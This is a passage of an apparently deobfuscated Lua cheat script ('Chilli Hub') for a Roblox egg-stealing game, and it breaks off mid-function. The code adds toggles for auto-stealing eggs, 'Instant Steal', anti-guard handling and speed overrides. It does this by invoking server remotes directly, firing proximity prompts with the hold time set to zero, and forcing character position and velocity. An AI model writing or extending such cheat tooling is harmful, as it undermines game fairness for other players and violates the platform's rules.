				if type(save2) == "table" and type(save2.FieldSignal) == "function" then
					for _, v21 in ipairs({ "EggInventory", "Inventory" }) do
						local ok, result = pcall(save2.FieldSignal, v21)

						if ok and type(result) == "table" and type(result.Connect) == "function" then
							local ok2, result2 = pcall(result.Connect, result, function()
								task.defer(recount)
							end)

							if ok2 and result2 then
								fn4(function()
									pcall(function()
										result2:Disconnect()
									end)
								end)
							end
						end
					end
				end

				tbl4.Lab.ForceSteal = function()
					n12 = 0
				end

				v20 = v19:CreateToggle({
					Name = "Steal Missing Lab Eggs",
					Default = false,
					Callback = function()
						tbl4.Steal.RiftPriority = tbl4.Toggle(v20, false) == true
						n12 = 0

						if not tbl4.Steal.RiftPriority then
							tbl4.Steal.RiftNeeds = {}
						end

						task.delay(0.3, function()
							pcall(tbl4.Lab.FixPickers)
						end)

						tbl3.Wake()
					end,
				})

				v19:CreateToggle({
					Name = "Skip Owned Lab Eggs",
					Note = "Only for the current recipe",
					Default = true,
					ShowWhen = v20,
					Callback = function(arg)
						tbl4.Lab.SkipOwned = arg ~= false
						pcall(recount)
					end,
				})

				local tbl35 = {}
				local tbl36 = {}

				for _, v21 in ipairs(tbl4.Lab.BannerList()) do
					table.insert(tbl35, v21.Name)
					tbl36[v21.Name] = v21.Id
				end

				v19:CreateMultiDropdown({
					Name = "Stock Lab Eggs For",
					Note = "Collects eggs for these banners even before they open",
					Options = tbl35,
					Default = {},
					ShowWhen = v20,
					Callback = function(arg)
						local stock = {}

						if type(arg) == "table" then
							for k, v21 in pairs(arg) do
								k = v21 == true and type(k) == "string" and k
								local flag5

								if k then
									flag5 = k
								else
									flag5 = type(v21) == "string" and v21
								end

								flag5 = flag5 or nil

								if flag5 and tbl36[flag5] then
									stock[tbl36[flag5]] = true
								end
							end
						end

						tbl4.Lab.Stock = stock
						n12 = 0

						task.spawn(function()
							pcall(recount)
						end)

						tbl3.Wake()
					end,
				})

				local ok, result = pcall(function()
					local directory = tbl.Assets and tbl.Assets.Directory
					local tbl37 = { Biohazard = "Biohazard", Experimental = "Experimental", UnstableDNA = "Unstable DNA" }

					tbl4.Lab.LabelsFor = function(arg)
						local tbl38 = {}
						local tbl39 = {}
						tbl4.Lab.PoolOf(arg)
						local tbl40 = tbl4.Lab.PoolLists[arg] or {}

						for _, v21 in ipairs(tbl40) do
							local flag5 = type(directory) == "table" and directory[v21.Category] or nil
							local n13 = v21.Share * 100
							local str2 = n13 < 1 and "<1%" or string.format("%d%%", math.floor(n13 + 0.5))
							local str3 = string.format("%s Egg (%s)", tostring(type(flag5) == "table" and flag5.DisplayName or v21.Category), str2)

							if tbl39[str3] then
								local format = string.format
								local v22 = tostring
								local displayName = type(flag5) == "table" and flag5.DisplayName or v21.Category
								local category = v21.Category
								str3 = format("%s Egg [%s] (%s)", v22(displayName), category, str2)
							end

							table.insert(tbl38, str3)
							tbl39[str3] = v21.Category
						end

						return tbl38, tbl39
					end

					for _, v21 in ipairs(tbl4.Lab.BannerList()) do
						local id = v21.Id
						local v22, v23 = tbl4.Lab.LabelsFor(id)
						local tbl38 = { CategoryOf = v23 }
						tbl4.Lab.Pickers[id] = tbl38
						local tbl39 = {}

						for i = 1, math.min(5, #v22) do
							table.insert(tbl39, v22[i])
						end

						tbl38.Handle = v19:CreateMultiDropdown({
							Name = (tbl37[id] or v21.Name) .. " Lab Eggs",
							Options = v22,
							Default = tbl39,
							ShowWhen = v20,
							Callback = function(arg)
								local tbl40 = {}

								if type(arg) == "table" then
									for k, v24 in pairs(arg) do
										k = v24 == true and type(k) == "string" and k
										local flag5

										if k then
											flag5 = k
										else
											flag5 = type(v24) == "string" and v24
										end

										local v25 = flag5 or nil

										if v25 and tbl38.CategoryOf[v25] then
											tbl40[tbl38.CategoryOf[v25]] = true
										end
									end
								end

								tbl4.Lab.StockEggs[id] = next(tbl40) ~= nil and tbl40 or nil
								n12 = 0

								task.spawn(function()
									pcall(recount)
								end)

								tbl3.Wake()
							end,
						})
					end
				end)

				if not ok then
					warn("[Chilli Hub] Lab egg pickers failed: " .. tostring(result))
				end

				task.spawn(function()
					pcall(tbl4.Lab.RefreshPools)
				end)

				v19:CreateSlider({
					Name = "Stock Per Egg",
					Min = 1,
					Max = 30,
					Default = 3,
					Increment = 1,
					Unit = "",
					ShowWhen = v20,
					Callback = function(arg)
						tbl4.Lab.StockPer = math.clamp(math.floor(tonumber(arg) or 3), 1, 30)

						task.spawn(function()
							pcall(recount)
						end)
					end,
				})
			end

			do
				local n11 = 5
				local n12 = 5
				local n13 = 60
				local v20 = nil
				local n14 = 0
				local n15 = 0
				local flag4 = false
				local tbl35 = {}

				local function fn16()
					local save2 = tbl.Save

					if type(save2) == "table" and type(save2.Get) == "function" then
						local ok, result = pcall(save2.Get)
						if ok and type(result) == "table" then
							return result
						end
					end

					return nil
				end

				local function fn17()
					local v21 = fn16()
					local directory = tbl.Areas and tbl.Areas.Directory
					local directory2 = tbl.Assets and tbl.Assets.Directory
					if not v21 or type(directory) ~= "table" or type(directory2) ~= "table" then
						return
					end
					local index = type(v21.Index) == "table" and v21.Index or {}
					local tbl36 = {}
					local v22 = pairs
					local inventory = v21.Inventory or {}

					for _, v23 in v22(inventory) do
						if type(v23) == "table" and v23.Category ~= nil then
							tbl36[tostring(v23.Category)] = true
						end
					end

					local v23 = pairs
					local eggInventory = v21.EggInventory or {}

					for _, v24 in v23(eggInventory) do
						if type(v24) == "table" and v24.AssetCategory ~= nil then
							tbl36[tostring(v24.AssetCategory)] = true
						end
					end

					local tbl37 = {}

					for _, v24 in pairs(directory) do
						local flag5 = type(v24) == "table" and type(v24.Rarity) == "table"

						if flag5 then
							flag5 = tonumber(v24.Rarity.RarityNumber or v24.Rarity.Rank)
						end

						flag5 = flag5 or 0
						local v25 = pairs
						local dropTable = type(v24) == "table" and v24.DropTable or {}

						for _, v26 in v25(dropTable) do
							local flag6 = type(v26) == "table" and v26[1] or nil
							local n16 = type(v26) == "table" and tonumber(v26[2]) or 0
							local flag7 = flag6 ~= nil and directory2[flag6] or nil

							if type(flag7) == "table" and n16 > 0 and flag7.DontRoll ~= true then
								local str2 = tostring(flag6)

								if index[flag6] ~= true and not tbl36[str2] and (tbl37[str2] == nil or flag5 > tbl37[str2]) then
									tbl37[str2] = flag5
								end
							end
						end
					end

					tbl34 = tbl37
				end

				local function fn18(arg, ...)
					local v21 = networking:FindFirstChild(arg)
					if not v21 or not v21:IsA("RemoteFunction") then
						return false
					end
					local ok, result = pcall(v21.InvokeServer, v21, ...)
					return ok and result ~= false
				end

				local function fn19(arg, arg2)
					local tbl36 = {}
					if type(arg) ~= "table" then
						return tbl36
					end

					for _, v21 in ipairs(arg2) do
						local flag5 = arg

						for _, v22 in ipairs(v21) do
							flag5 = type(flag5) == "table" and flag5[v22] or nil
						end

						local v22 = ipairs
						local tbl37 = type(flag5) == "table" and flag5 or {}

						for _, v23 in v22(tbl37) do
							if type(v23) == "table" and v23.AssetId ~= nil then
								table.insert(tbl36, v23.AssetId)
							end
						end
					end

					return tbl36
				end

				local tbl36 = {
					{
						Id = "LimitedEgg",
						Gear = "GravityDisruptor",
						Module = "LimitedEgg",
						Lists = { { "Entries" }, { "MechaReroll", "Entries" } },
					},
					{
						Id = "BrainrotEgg",
						Gear = "BeeLauncher",
						Module = "BrainrotEgg",
						Lists = { { "Entries" } },
					},
					{
						Id = "MonsterEgg",
						Gear = "BeeLauncher",
						Module = "MonsterEgg",
						Lists = { { "Entries" }, { "MechaEntries" } },
					},
				}

				local function fn20()
					local v21 = fn16()
					if not v21 then
						return
					end
					local index = type(v21.Index) == "table" and v21.Index or {}
					local indexClaimedCategories = type(v21.IndexClaimedCategories) == "table" and v21.IndexClaimedCategories or {}

					for k, v22 in pairs(index) do
						if v22 == true and indexClaimedCategories[k] ~= true then
							fn18("RF/Codex/AskRedeemAll")
							break
						end
					end

					local gearInventory = type(v21.GearInventory) == "table" and v21.GearInventory or {}

					for _, v22 in ipairs(tbl36) do
						local flag5 = (tonumber(gearInventory[v22.Gear]) or 0) <= 0

						if flag5 then
							flag5 = os.clock() >= (tbl35[v22.Id] or 0)
						end

						if flag5 then
							local v23 = fn19(tbl[v22.Module], v22.Lists)
							local flag6 = #v23 > 0

							for _, v24 in ipairs(v23) do
								if index[v24] ~= true then
									flag6 = false
									break
								end
							end

							if flag6 then
								tbl35[v22.Id] = os.clock() + n13
								fn18("RF/Codex/AskRedeemLimitedEgg", v22.Id)
							end
						end
					end
				end

				tbl3.Add(function()
					local now = os.clock()

					if flag3 and now >= n14 then
						n14 = now + n11
						pcall(fn17)
					end

					if not flag4 and now >= n15 and tbl4.Toggle(tbl4.IndexClaimHandle, false) then
						flag4 = true
						n15 = now + n12

						task.spawn(function()
							pcall(fn20)
							flag4 = false
						end)
					end

					return false
				end)

				v20 = v19:CreateToggle({
					Name = "Steal Missing Index Eggs",
					Note = "Also steal eggs missing from your index, highest area first",
					Default = false,
					Callback = function()
						flag3 = tbl4.Toggle(v20, false) == true
						n14 = 0

						if not flag3 then
							tbl34 = {}
						end

						tbl3.Wake()
					end,
				})

				tbl4.IndexClaimRestart = function()
					n15 = 0
					tbl3.Wake()
				end
			end

			tbl4.Steal.PriorityHandle = v19:CreateDropdown({
				Name = "Steal Priority",
				Options = tbl5,
				Default = tbl5[4],
				Callback = function(arg)
					if table.find(tbl5, arg) then
						v4 = arg

						if type(tbl4.ResortSteal) == "function" then
							tbl4.ResortSteal()
						end
					end
				end,
			})

			tbl4.SafeCarry.InstantHandle = v19:CreateToggle({
				Name = "Instant Steal",
				Note = "Delivers the egg to the safe zone in a few seconds, needs enough Speed",
				Default = false,
				Callback = function(arg)
					if type(arg) ~= "boolean" then
						arg = tbl4.Toggle(tbl4.SafeCarry.InstantHandle, false)
					end

					tbl4.SafeCarry.LineDrop = arg ~= false
					tbl4.SafeCarry.SpeedJitter = tbl4.SafeCarry.LineDrop and 0 or 0.08

					if tbl4.StealPanelSync then
						pcall(tbl4.StealPanelSync)
					end
				end,
			})

			tbl4.SafeCarry.RunHandle = v19:CreateSlider({
				Name = "Tween Speed",
				Note = "Over 100% may glitch",
				Min = 50,
				Max = 120,
				Default = 100,
				Increment = 1,
				Unit = "%",
				Callback = function(arg)
					tbl4.SafeCarry.RunSpeed = math.clamp(tonumber(arg) or 100, 50, 120) / 100
				end,
			})

			v19:CreateSlider({
				Name = "Carry Speed",
				Min = 80,
				Max = 120,
				Default = 100,
				Increment = 1,
				Unit = "%",
				Callback = function(arg)
					tbl4.SafeCarry.CarryScale = math.clamp(tonumber(arg) or 100, 80, 120) / 100
				end,
			})

			tbl4.BossPortalUp = function()
				return workspace:FindFirstChild("ScrambleArenaPortal") ~= nil
			end

			tbl4.AntiGuard.Handle = v2:CreateState({ Name = "Anti Guard Enabled", Default = false })

			pcall(function()
				tbl4.AntiGuard.Enabled = tbl4.AntiGuard.Handle:Get() == true
			end)

			pcall(function()
				tbl4.AntiGuard.Handle:Subscribe(function(arg)
					if type(arg) ~= "boolean" then
						arg = tbl4.AntiGuard.Handle:Get()
					end

					tbl4.AntiGuard.Enabled = arg == true

					if tbl4.StealPanelSync then
						pcall(tbl4.StealPanelSync)
					end

					if tbl4.AntiGuard.Render and tbl4.UiDefer then
						tbl4.UiDefer(function()
							pcall(tbl4.AntiGuard.Render, false)
						end)
					end
				end)
			end)

			tbl4.AntiGuard.PanelHandle = v19:CreateToggle({
				Name = "Anti Guard Panel",
				Default = true,
				Callback = function(panelShown)
					if type(panelShown) ~= "boolean" then
						panelShown = tbl4.Toggle(tbl4.AntiGuard.PanelHandle, true)
					end

					tbl4.AntiGuard.PanelShown = panelShown

					if tbl4.AntiGuard.ShowPanel then
						pcall(tbl4.AntiGuard.ShowPanel, panelShown)
					end
				end,
			})

			local v20
			v20 = nil
			local v21
			v21 = nil
			local v22
			v22 = nil
			local str2
			str2 = "None"
			local str3
			str3 = "Idle"
			local flag4
			flag4 = false
			local n11
			n11 = 0
			local tbl35
			tbl35 = {}
			local n12
			n12 = 20
			local uid
			uid = nil
			local fn16

			fn16 = function(arg)
				return arg ~= n11 or not tbl4.Toggle(v20, false)
			end

			local fn17

			do
				local tbl36 = {}

				local function fn18(arg)
					if type(arg) ~= "number" or tbl36[arg] then
						return
					end
					tbl36[arg] = true

					task.delay(math.max(0, arg - workspace:GetServerTimeNow()) + 0.05, function()
						tbl36[arg] = nil
						tbl3.Wake()
					end)
				end

				local n13 = 0

				fn17 = function()
					local areaEggCycle = tbl.AreaEggCycle
					if type(areaEggCycle) ~= "table" then
						return nil
					end

					local ok, result, result2, result3, result4 = pcall(function()
						local serverTimeNow = workspace:GetServerTimeNow()
						local nextResetTime = areaEggCycle.NextResetTime
						return serverTimeNow, areaEggCycle.IsNightPhase(serverTimeNow), areaEggCycle.NextNightTime(serverTimeNow), nextResetTime(serverTimeNow)
					end)

					if not ok or type(result4) ~= "number" then
						return nil
					end

					if result2 == true then
						n13 = result4 + tbl4.WallOpenDelay()
						fn18(n13)
						return n13, "night", result
					end

					if tbl4.WallSealed() then
						fn18(result + 0.3)
						return math.max(n13, result), "wall", result
					end

					if type(result3) == "number" and result3 > result then
						fn18(result3)
					end

					return nil
				end
			end

			do
				local areaEggResetWall = tbl.AreaEggResetWall
				local changed = type(areaEggResetWall) == "table" and areaEggResetWall.Changed or nil

				if changed and type(changed.Connect) == "function" then
					local ok, result = pcall(function()
						return changed:Connect(function()
							tbl3.Wake()
						end)
					end)

					if ok and result then
						fn4(function()
							pcall(function()
								result:Disconnect()
							end)
						end)
					end
				end
			end

			local n13
			n13 = 8
			local v23
			v23 = nil
			local n14
			n14 = 0
			local fn18, fn19, fn20

			local function fn21(arg)
				local tbl36 = {}
				local str4 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local eggState = tbl.EggState

				if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
					task.spawn(function()
						local ok, result = pcall(eggState.ReadFieldEggs)

						if ok and type(result) == "table" and type(result.Records) == "table" then
							for _, record in pairs(result.Records) do
								local flag5 = type(record) == "table" and type(record.Uid) == "string"

								if flag5 then
									flag5 = not (arg and string.sub(record.Uid, 1, #str4) == str4)
								end

								if flag5 then
									tbl36[record.Uid] = true
								end
							end
						end
					end)
				end

				return tbl36
			end

			fn18 = function()
				if v23 == nil then
					return false
				end

				if tbl4.IsNight() then
					return true
				end

				if n14 == math.huge then
					n14 = os.clock() + n13
				end

				return false
			end

			fn19 = function()
				if v23 and n14 == math.huge then
					return
				end
				v23 = fn21(true)
				n14 = math.huge
				table.clear(tbl31)
				table.clear(tbl33)
				table.clear(tbl32)
				table.clear(tbl35)
				uid = nil
			end

			fn20 = function()
				if not v23 then
					return false
				end

				if n14 <= os.clock() then
					v23 = nil
					return false
				end
				local v24 = fn21()
				if next(v24) == nil then
					return true
				end
				local flag5 = false
				local flag6 = false

				for k in pairs(v24) do
					if v23[k] then
						flag5 = true
					else
						flag6 = true
					end
				end

				if not flag5 then
					v23 = nil
					return false
				end
				return not flag6
			end

			local fn22

			do
				local function fn23(arg)
					local directory = tbl.Assets and tbl.Assets.Directory
					local flag5 = type(directory) == "table" and directory[tostring(arg)] or nil
					local rarity = type(flag5) == "table" and type(flag5.Rarity) == "table" and flag5.Rarity or nil
					local tbl36 = {}

					if rarity then
						rarity = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					tbl36.RarityNumber = rarity or 0
					tbl36.EarningRate = type(flag5) == "table" and tonumber(flag5.EarningRate) or 0
					return tbl36
				end

				local function fn24(arg)
					local mutations = tbl.Mutations

					if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
						local ok, result = pcall(mutations.EarningsFor, type(arg) == "table" and arg or {})
						if ok and type(result) == "number" then
							return result
						end
					end

					return 1
				end

				local function fn25(arg, arg2)
					local eggRecords = tbl.EggRecords

					if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
						local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
						if ok and type(result) == "number" then
							return result
						end
					end

					return 0
				end

				fn22 = function(arg, arg2)
					local records = nil
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
						task.spawn(function()
							local ok, result = pcall(eggState.ReadFieldEggs)

							if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
								records = result.Records
							end
						end)
					end

					if not records then
						local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
						if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
							return {}
						end
						local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
						records = ok and type(result) == "table" and result.Records or nil
					end

					if type(records) ~= "table" then
						return {}
					end
					local tbl36 = {}
					local tbl37 = {}

					for _, record in pairs(records) do
						local uid2 = type(record) == "table" and record.Uid or nil

						if uid2 and record.State ~= "Claimed" then
							tbl37[uid2] = true
						end

						local flag5 = uid2 and (record.State == "Slot" or record.State == "Dropped" or record.State == "Carried" and arg2 == true and arg ~= true and not (tbl4.Steal.Carrying and uid2 == tbl4.Steal.CarryUid))
						local v24 = uid2 and tbl31[uid2] or nil
						local flag6 = uid2 and tbl32[uid2] == true or false
						local flag7 = arg ~= true and flag3 and uid2 and tbl34[tostring(record.AssetCategory)] or nil
						local flag8 = arg ~= true and tbl4.Steal.RiftPriority == true and uid2 ~= nil and tbl4.Steal.RiftNeeds[tostring(record.AssetCategory)] == true
						local flag9 = arg == true or v24 ~= nil or flag6 or flag8 or flag7 ~= nil or tbl29[tostring(record.AreaId)] == true
						local flag10 = arg ~= true and v24 == nil and tbl33[uid2] == true
						local flag11 = v23 ~= nil and v23[uid2] == true
						flag5 = flag5 and typeof(record.BottomCFrame) == "CFrame"

						if flag5 then
							flag5 = (tbl35[uid2] or 0) <= os.clock()
						end

						if flag5 and flag9 and not flag10 and not flag11 then
							local v25 = fn23(record.AssetCategory)
							local str4 = tostring(record.AssetCategory)
							local flag12 = v25.RarityNumber >= n8
							local flag13 = next(tbl30) == nil or tbl30[str4] == true
							local n15 = tonumber(record.AssetScale) or 1
							local v26 = fn24(record.Mutations)
							local n16 = n15 > 5 and (n15 / 5) ^ 1.2 * 19.637875755794113 or n15 ^ 1.85
							local flag14 = n9 <= 0 or v25.EarningRate * n16 * v26 >= n9
							flag14 = flag12 and flag13 and flag14
							local flag15 = flag8 and not flag14 and not flag6 and v24 == nil and flag7 == nil
							local lastSkip = arg ~= true and tbl4.SafeCarry.Unsafe({ Uid = uid2, Category = str4 })

							if lastSkip then
								tbl31[uid2] = nil
								tbl32[uid2] = nil
								tbl4.SafeCarry.LastSkip = lastSkip
							elseif arg == true or v24 or flag6 or flag8 or flag7 ~= nil or flag14 then
								table.insert(tbl36, {
									Uid = uid2,
									Category = str4,
									Scale = n15,
									State = record.State,
									Rarity = v25.RarityNumber,
									Weight = fn25(record.AssetCategory, n15),
									Mutation = v26,
									Value = v25.EarningRate * n16 * v26,
									CFrame = record.BottomCFrame,
									AreaId = tostring(record.AreaId),
									Rift = arg ~= true and flag8,
									RiftOnly = arg ~= true and flag15,
									RiftNow = arg ~= true and flag15 and tbl4.Steal.RiftCurrent[str4] == true,
									Index = flag7,
									Forced = arg ~= true and v24 and v24.At or nil,
									Priority = arg ~= true and flag6,
								})
							end
						end
					end

					if next(tbl37) ~= nil then
						for k in pairs(tbl31) do
							if not tbl37[k] then
								tbl31[k] = nil
							end
						end

						for k in pairs(tbl32) do
							if not tbl37[k] then
								tbl32[k] = nil
							end
						end

						for k in pairs(tbl33) do
							if not tbl37[k] then
								tbl33[k] = nil
							end
						end
					end

					table.sort(tbl36, function(arg3, arg4)
						if arg3.Forced ~= nil ~= arg4.Forced ~= nil then
							return arg3.Forced ~= nil
						end

						if arg3.Forced and arg4.Forced and arg3.Forced ~= arg4.Forced then
							return arg3.Forced < arg4.Forced
						end

						if arg3.Priority ~= arg4.Priority then
							return arg3.Priority == true
						end

						if arg3.RiftOnly ~= arg4.RiftOnly then
							return arg4.RiftOnly == true
						end

						if arg3.RiftOnly and arg3.RiftNow ~= arg4.RiftNow then
							return arg3.RiftNow == true
						end

						if arg3.Index ~= nil ~= arg4.Index ~= nil then
							return arg3.Index ~= nil
						end

						if arg3.Index and arg4.Index and arg3.Index ~= arg4.Index then
							return arg3.Index > arg4.Index
						end

						if v4 == tbl5[2] and arg3.Weight ~= arg4.Weight then
							return arg3.Weight > arg4.Weight
						end

						if v4 == tbl5[3] and arg3.Mutation ~= arg4.Mutation then
							return arg3.Mutation > arg4.Mutation
						end

						if v4 == tbl5[4] and arg3.Value ~= arg4.Value then
							return arg3.Value > arg4.Value
						end

						if v4 == tbl5[5] and arg3.Value ~= arg4.Value then
							return arg3.Value < arg4.Value
						end

						if arg3.Rarity ~= arg4.Rarity then
							return arg3.Rarity > arg4.Rarity
						end

						if arg3.Value ~= arg4.Value then
							return arg3.Value > arg4.Value
						end
						return tostring(arg3.Uid) < tostring(arg4.Uid)
					end)

					return tbl36
				end
			end

			local n15
			n15 = 6
			local fn23, fn24, fn25, fn26, fn27

			do
				local v24 = nil
				local connection = nil

				fn23 = function(arg, arg2, arg3, arg4, arg5)
					local n16 = arg2 - arg.Position
					local magnitude = n16.Magnitude
					local n17 = math.max(arg4, 0.0041666666666666666)
					local vector = Vector3.zero

					if magnitude > 0.01 then
						vector = n16.Unit * math.min(arg3, magnitude / n17)
					end

					local assemblyLinearVelocity = vector + Vector3.new(0, workspace.Gravity * n17 * 0.5, 0)

					if magnitude > 2 then
						if not arg5.mark then
							arg5.mark = magnitude
							arg5.clock = 0
						end

						arg5.clock = arg5.clock + arg4

						if arg5.clock >= 0.4 then
							if arg5.mark - magnitude < arg3 * 0.1 then
								pcall(function()
									arg.CFrame = arg.CFrame + n16.Unit * math.min(magnitude, arg3 * n17)
								end)
							end

							arg5.mark = magnitude
							arg5.clock = 0
						end
					else
						arg5.mark = nil
					end

					pcall(function()
						arg.AssemblyLinearVelocity = assemblyLinearVelocity
						arg.AssemblyAngularVelocity = Vector3.zero
					end)

					return magnitude <= 0.5
				end

				fn24 = function()
					local v25 = tbl4.Root()

					if v25 then
						pcall(function()
							v25.AssemblyLinearVelocity = Vector3.zero
							v25.AssemblyAngularVelocity = Vector3.zero
						end)
					end
				end

				local connection2 = nil
				local tbl36 = {}

				fn25 = function()
					v24 = nil

					if connection then
						connection:Disconnect()
						connection = nil
					end

					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end
				end

				fn26 = function()
					local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
					return num ~= nil and num > workspace:GetServerTimeNow()
				end

				local flag5 = false

				local function fn28()
					if flag5 then
						return true
					end
					return true
				end

				fn27 = function(arg, arg2)
					v24 = arg
					flag5 = arg2 == true
					if connection or not arg then
						return
					end
					tbl36 = {}

					connection = RunService.Heartbeat:Connect(function()
						if not v24 or fn28() or fn26() or tbl4.AntiGuard.Busy then
							return
						end
						local v25 = tbl4.Root()
						if not v25 then
							return
						end

						pcall(function()
							local rotation = v25.CFrame.Rotation
							v25.CFrame = CFrame.new(v24) * rotation
							v25.AssemblyLinearVelocity = Vector3.zero
							v25.AssemblyAngularVelocity = Vector3.zero
						end)
					end)

					connection2 = RunService.PreSimulation:Connect(function(deltaTime)
						if not v24 or not fn28() or fn26() or tbl4.AntiGuard.Busy then
							return
						end
						local v25 = tbl4.Root()

						if v25 then
							fn23(v25, v24, 400, deltaTime, tbl36)
						end
					end)
				end
			end

			fn4(fn25)
			local fn28

			fn28 = function()
				fn25()
				tbl4.EndFlight()
				tbl4.GodMode(false)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false
				end
			end

			local n16, fn29, fn30

			do
				local n17 = 1.5
				n16 = 0.6

				local function fn31(arg, arg2)
					local x = arg2.X
					return (Vector3.new(arg.X, 0, arg.Z) - Vector3.new(x, 0, arg2.Z)).Magnitude
				end

				local function fn32(arg)
					local ok, result = pcall(function()
						return arg:GetPivot().Position
					end)

					return ok and result or nil
				end

				fn29 = function(arg, arg2, arg3)
					local v24 = fn31(arg.Position, arg3)
					local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")

					if areaEggSlotsClient then
						for _, child in ipairs(areaEggSlotsClient:GetChildren()) do
							if child:IsA("Model") and child.Name ~= arg2 then
								local v25 = fn32(child)
								if v25 and fn31(v25, arg.Position) + n17 < v24 then
									return false
								end
							end
						end
					end

					for _, child in ipairs(workspace:GetChildren()) do
						if child:IsA("Model") and child.Name ~= arg2 and #child.Name == 32 and child:FindFirstChild("Hitbox") then
							local v25 = fn32(child)
							if v25 and fn31(v25, arg.Position) + n17 < v24 then
								return false
							end
						end
					end

					return true
				end

				tbl4.Steal.WrongEgg = function(carryUid)
					local steal = tbl4.Steal
					if type(carryUid) ~= "string" or not steal.Carrying or steal.CarryUid == carryUid then
						return false
					end
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
						pcall(eggState.DropFieldEgg, "PlayerRequest")
					end

					local n18 = 0

					while steal.Carrying and n18 < 1 do
						n18 += RunService.Heartbeat:Wait()
					end

					steal.Carrying = false
					steal.CarryUid = carryUid
					return true
				end

				fn30 = function(arg, arg2, arg3)
					local n18 = arg3 or 14
					local v24 = nil
					local v25 = nil

					for _, child in ipairs(workspace:GetChildren()) do
						if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
							local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

							if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
								local v26 = fn31(child.Position, arg2)

								if v26 < n18 then
									n18 = v26
									v24 = carryAreaEgg
									v25 = child
								end
							end
						end
					end

					if not v24 or not v25 then
						return nil
					end

					if type(arg) == "string" and not fn29(v25, arg, arg2) then
						return nil
					end
					return v24, v25
				end
			end

			local fn31

			fn31 = function(arg)
				local eggState = tbl.EggState

				if type(arg) == "string" and type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
					pcall(eggState.CarryFieldEgg, arg)
				end
			end

			local fn32

			do
				local function fn33()
					local carryUid = tbl4.Steal.CarryUid
					return type(carryUid) == "string" and carryUid or nil
				end

				local function fn34(arg)
					local v24 = fn33()
					if not v24 or type(arg) ~= "string" then
						return true
					end
					return v24 == arg
				end

				local function fn35(arg)
					if type(arg) ~= "string" then
						return false
					end
					local v24 = fn22(false, true)
					if #v24 == 0 then
						return true
					end

					for _, v25 in ipairs(v24) do
						if v25.Uid == arg then
							return true
						end
					end

					return false
				end

				local function fn36(arg)
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
						pcall(eggState.DropFieldEgg, "PlayerRequest")
					end

					local n17 = 0

					while tbl4.Steal.Carrying and n17 < 1 and not fn16(arg) do
						n17 += RunService.Heartbeat:Wait()
					end
				end

				fn32 = function(arg, arg2)
					local n17 = 0

					while not tbl4.Steal.Carrying and n17 < n16 and not fn16(arg2) do
						n17 += RunService.Heartbeat:Wait()
					end

					if not tbl4.Steal.Carrying then
						str3 = "The egg never reached the hand"
						return false
					end

					if fn34(arg) then
						return true
					end
					local v24 = fn33()
					if fn35(v24) then
						str3 = "Holding another egg that still matches, delivering it"
						return true
					end
					str3 = "Wrong egg in hand, dropping it"
					fn36(arg2)
					return false
				end
			end

			local fn33

			fn33 = function(arg, arg2)
				local eggState = tbl.EggState
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not position then
					return false
				end
				local n17 = 0
				local huge = math.huge
				local n18 = 0

				while n17 < 1.5 do
					if fn16(arg2) then
						return false
					end

					if tbl4.Steal.Carrying and not tbl4.Steal.WrongEgg(arg.Uid) then
						return true
					end

					if huge >= 0.06 then
						local v24 = fn30(arg.Uid, position)

						if v24 then
							pcall(function()
								v24.HoldDuration = 0
							end)

							n18 = 0

							if typeof(fireproximityprompt) == "function" then
								pcall(fireproximityprompt, v24)
							end
						else
							n18 += 1
							if n18 >= 4 then
								return false
							end

							if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
								pcall(eggState.CarryFieldEgg, arg.Uid)
							end
						end

						huge = 0
					end

					local result = RunService.Heartbeat:Wait()
					n17 += result
					huge += result
				end

				return tbl4.Steal.Carrying == true
			end

			local fn34

			local v24 = fn2(function()
				return ReplicatedStorage.Shared.Modules.Ragdoll
			end)

			fn34 = function()
				local character = localPlayer.Character

				if type(v24) == "table" and type(v24.IsRagdolled) == "function" then
					local ok, result = pcall(v24.IsRagdolled, character)
					if ok and result == true then
						return true
					end
				end

				local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				if num and num > workspace:GetServerTimeNow() then
					return true
				end
				character = character and character:FindFirstChildOfClass("Humanoid")
				if character then
					local state = character:GetState()
					return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
				end
				return false
			end

			local fn35

			fn35 = function(arg, arg2)
				if tbl4.Steal.Carrying then
					return true
				end
				local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
				if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
					return false
				end
				local n17 = 0

				while n17 < 1 do
					if fn16(arg2) or tbl4.Steal.Carrying then
						return tbl4.Steal.Carrying == true
					end
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
					ok = ok and type(result) == "table" and result.Records or nil

					if type(ok) == "table" then
